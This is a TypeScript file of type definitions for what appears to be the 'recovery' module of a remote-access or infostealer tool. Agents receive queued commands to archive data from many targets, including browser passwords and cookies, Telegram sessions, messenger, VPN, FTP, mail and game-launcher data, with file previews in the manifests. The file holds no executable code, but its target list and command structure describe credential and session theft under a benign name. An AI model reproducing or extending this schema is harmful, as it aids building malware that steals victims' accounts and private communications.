export type RecoveryTargetType =
        | 'chromium-history'
        | 'chromium-bookmarks'
        | 'chromium-cookies'
        | 'chromium-passwords'
        | 'gecko-history'
        | 'gecko-bookmarks'
        | 'gecko-cookies'
        | 'gecko-passwords'
        | 'minecraft-saves'
        | 'minecraft-config'
        | 'telegram-session'
        | 'pidgin-data'
        | 'psi-data'
        | 'discord-data'
        | 'slack-data'
        | 'element-data'
        | 'icq-data'
        | 'signal-data'
        | 'viber-data'
        | 'whatsapp-data'
        | 'skype-data'
        | 'tox-data'
        | 'nordvpn-data'
        | 'openvpn-data'
        | 'protonvpn-data'
        | 'surfshark-data'
        | 'expressvpn-data'
        | 'cyberghost-data'
        | 'foxmail-data'
        | 'mailbird-data'
        | 'outlook-data'
        | 'thunderbird-data'
        | 'cyberduck-data'
        | 'filezilla-data'
        | 'winscp-data'
        | 'growtopia-data'
        | 'roblox-data'
        | 'battlenet-data'
        | 'ea-app-data'
        | 'epic-games-data'
        | 'steam-data'
        | 'ubisoft-connect-data'
        | 'gog-galaxy-data'
        | 'riot-client-data'
        | 'custom-path';

export interface RecoveryTargetSelection {
        type: RecoveryTargetType;
        label?: string;
        path?: string;
        paths?: string[];
        recursive?: boolean;
}

export interface RecoveryCommandPayload {
        requestId: string;
        selections: RecoveryTargetSelection[];
        archiveName?: string;
        notes?: string;
}

export interface RecoveryArchiveTargetSummary extends RecoveryTargetSelection {
        resolvedPaths?: string[];
        totalEntries?: number;
        totalBytes?: number;
}

export type RecoveryArchiveEntryType = 'file' | 'directory';

export interface RecoveryArchiveManifestEntry {
        path: string;
        size: number;
        modifiedAt: string;
        mode: string;
        type: RecoveryArchiveEntryType;
        target: string;
        sourcePath?: string;
        preview?: string;
        previewEncoding?: 'utf-8' | 'base64';
        truncated?: boolean;
}

export interface RecoveryArchive {
        id: string;
        agentId: string;
        requestId: string;
        createdAt: string;
        name: string;
        size: number;
        sha256: string;
        targets: RecoveryArchiveTargetSummary[];
        entryCount: number;
        notes?: string;
}

export interface RecoveryArchiveDetail extends RecoveryArchive {
        manifest: RecoveryArchiveManifestEntry[];
}

export interface RecoveryRequestInput {
        selections: RecoveryTargetSelection[];
        archiveName?: string;
        notes?: string;
}

export interface RecoveryQueueResponse {
        requestId: string;
        commandId: string;
}
